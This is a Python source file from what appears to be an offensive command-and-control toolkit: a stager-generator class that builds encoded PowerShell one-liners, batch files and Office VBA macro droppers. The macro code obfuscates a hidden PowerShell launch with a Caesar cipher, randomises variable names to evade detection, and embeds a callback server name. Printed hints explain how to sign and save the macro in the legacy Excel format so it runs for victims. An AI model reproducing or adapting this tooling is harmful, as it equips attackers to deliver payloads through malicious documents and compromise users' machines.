# -*- coding: utf8 -*-
from lib import helpers

#****************************************************************************************
# Class generating all type of stagers, based on some powershell code in all cases
#****************************************************************************************
class GenStager:

	#-----------------------------------------------------------
	@classmethod
	def encodedCommand(cls, stagerParameters):
		"""Creates base64 encoded command suitable for a 'powershell -Enc' command line"""
		
		# Construct the powershell encoded command from a template, substituting palceholders with proper parameters
		posh = helpers.convertFromTemplate(stagerParameters, 'templates/stage.tpl')
		if posh == None: return
		
		# Turn the powershell code into a suitable powershell base64 encoded one line command
		base64Payload = helpers.powershellEncode(posh)
		
		return base64Payload
		
	#-----------------------------------------------------------
	@classmethod
	def oneLiner(cls, stagerParameters):
		"""Creates a powershell one liner command line using base64 encoded powershell script"""

		base64Payload = cls.encodedCommand(stagerParameters)

		if base64Payload == None: return
		
		oneLiner = helpers.convertFromTemplate({'payload': base64Payload}, 'templates/oneliner.tpl')
		return oneLiner

	#-----------------------------------------------------------
	@classmethod
	def batch(cls, stagerParameters):
		"""Creates a Windows batch file (.bat) that launches a powershell one liner command"""

		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)

		batch = helpers.convertFromTemplate({'oneliner': oneLiner}, 'templates/batch.tpl')
		if batch == None: return
				
		try:
			with open('stagers/stager.bat','w+') as f:
				f.write(batch)
				f.close()
				print helpers.color("[+] Batch stager saved in [stagers/stager.bat]")
		except IOError:
			print helpers.color("[!] Could not write stager file [stagers/stager.bat]")

	#-----------------------------------------------------------
	@classmethod
	def macro(cls, stagerParameters):
		"""Creates an Office VBA macro that launches a powershell one liner command"""
		
		command = "powershell -NoP -sta -NonI -W Hidden -Enc "
		
		# Scramble the oneliner with a dumb caesar cipher :-) Simple obfuscation will do
		key = helpers.randomInt(0,94) # 94 is the range of printable ASCII chars (between 32 and 126)
		encryptedCommand = ""
		for char in command:
			num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
			shifted = (num + key)%94 + 32
			if shifted == 34:
				encryptedCommand += "\"{}".format(chr(shifted)) # Handling the double quote print problem in VBA
			else:
				encryptedCommand += chr(shifted)

		# Randomize VBA variable names
		varTmp = helpers.randomString(5)
		varEncryptedCommand = helpers.randomString(5)
		varEncodedCommand = helpers.randomString(5)
		varFinalCommand = helpers.randomString(5)
		varFlag = helpers.randomString(5)
		varKey = helpers.randomString(5)
		varObjWMI = helpers.randomString(5)
		varObjStartup = helpers.randomString(5)
		varObjConfig = helpers.randomString(5)
		varObjProcess = helpers.randomString(5)

		parameters = {'varTmp':varTmp,'varEncryptedCommand':varEncryptedCommand,'encryptedCommand':encryptedCommand,\
					  'varEncodedCommand':varEncodedCommand,'varFinalCommand':varFinalCommand,'varFlag':varFlag,\
					  'varKey':varKey,'key':key,'varObjWMI':varObjWMI,'varObjStartup':varObjStartup,'varObjConfig':varObjConfig,\
					  'varObjProcess':varObjProcess,'serverName':stagerParameters['serverName']}

		macro = helpers.convertFromTemplate	(parameters, 'templates/macro.tpl')
		
		try:
			with open('stagers/macro.vb', 'w+') as f:
				f.write(macro)
				f.close()
				print helpers.color("[+] Macro stager saved in [stagers/macro.vb]")
				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
		except IOError:
			print helpers.color("[!] Could not write stager file [stagers/macro.vb]")
			
	#-----------------------------------------------------------
	@classmethod
	def macro2(cls, stagerParameters):
		"""Creates an Office VBA macro that launches a powershell one liner command"""
		
		# Randomize VBA variable names
		varTmp = helpers.randomString(5)
		varEncodedCommand = helpers.randomString(5)
		varFinalCommand = helpers.randomString(5)
		varFlag = helpers.randomString(5)
		varExec = helpers.randomString(5)

		parameters = {'varTmp':varTmp,'varEncodedCommand':varEncodedCommand,'varFinalCommand':varFinalCommand,'varFlag':varFlag,\
					  'varExec':varExec, 'serverName':stagerParameters['serverName']}

		macro = helpers.convertFromTemplate	(parameters, 'templates/macro2.tpl')
		
		try:
			with open('stagers/macro2.vb', 'w+') as f:
				f.write(macro)
				f.close()
				print helpers.color("[+] Macro stager saved in [stagers/macro2.vb]")
				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
		except IOError:
			print helpers.color("[!] Could not write stager file [stagers/macro2.vb]")
			
			
